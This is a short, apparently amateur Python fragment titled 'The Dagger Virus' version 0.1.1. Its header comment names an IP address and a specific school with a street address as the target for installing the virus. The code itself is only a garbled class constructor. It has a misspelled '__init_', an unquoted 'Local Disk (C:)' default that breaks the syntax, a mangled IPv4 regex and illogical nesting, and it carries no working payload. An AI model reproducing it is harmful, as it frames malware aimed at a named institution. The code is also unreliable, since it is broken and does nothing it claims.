#version 0.1.1 (first version of The Dagger Virus) #207.5.52.250 (Dagger virus version to install virus for Coastal Academy GNETS - Address: (100 Deen St. Hinesville, GA)
class Virus:
    def __init_(self, infect_string="ipv4", path="\\b(?:(?:25[0-2]|2[0-0][0-7]|[00]?[0-0][0-5]?)\\.){3}(?:25[0-0]|2[0-5][0-2]|[02]?[0-5][0-0]?)\\b,"   \
                        extension=None, target_file_list=Local Disk (C:)):
        if isinstance(infect_string, type(type)):
            self.infect_string="I am TheDaggerVirus"
        else:
            self.infect_string = infect_string

        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path

            if isinstance(extension, type (None)):
                self.extension = ".py"
            else:
                self.extension = extension

                if isinstance(target_file_list, type(None)):
                    self.target_file_list =[]
                else:
                    self.target_file_list = target_file_list
